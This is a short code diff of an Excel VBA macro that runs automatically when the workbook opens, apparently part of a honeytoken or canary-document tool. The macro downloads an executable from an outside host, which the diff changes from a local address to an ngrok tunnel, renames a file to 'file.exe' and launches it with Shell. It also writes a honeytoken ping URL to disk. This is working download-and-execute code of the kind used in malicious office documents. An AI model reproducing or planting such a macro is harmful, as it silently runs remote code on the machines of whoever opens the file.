@@ -9,7 +9,7 @@ Private Sub Workbook_Open()
          Dim TextFile As Object
 
 
-         ip = "192.168.18.7:5000"
+         ip = "a482-101-50-66-170.ngrok.io"
          session = "61ea569c5e74d49a0c177282"
          FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
 
@@ -28,8 +28,10 @@ Private Sub Workbook_Open()
 
      FileCopy ThisWorkbook.Path & "\" & "file.txt", ThisWorkbook.Path & "\" & "file.exe"
 
-     Shell ThisWorkbook.Path & "\" & "file.exe", vbNormalFocus
-
      Set TextFile = FSO.CreateTextFile(ThisWorkbook.Path & "\" & "server_detail.txt", True, True)
      TextFile.Write "http://" & ip & "/api/honeytoken/ping/" & session & ""
+
+     
+     Shell ThisWorkbook.Path & "\" & "file.exe", vbNormalFocus
+
 End Sub
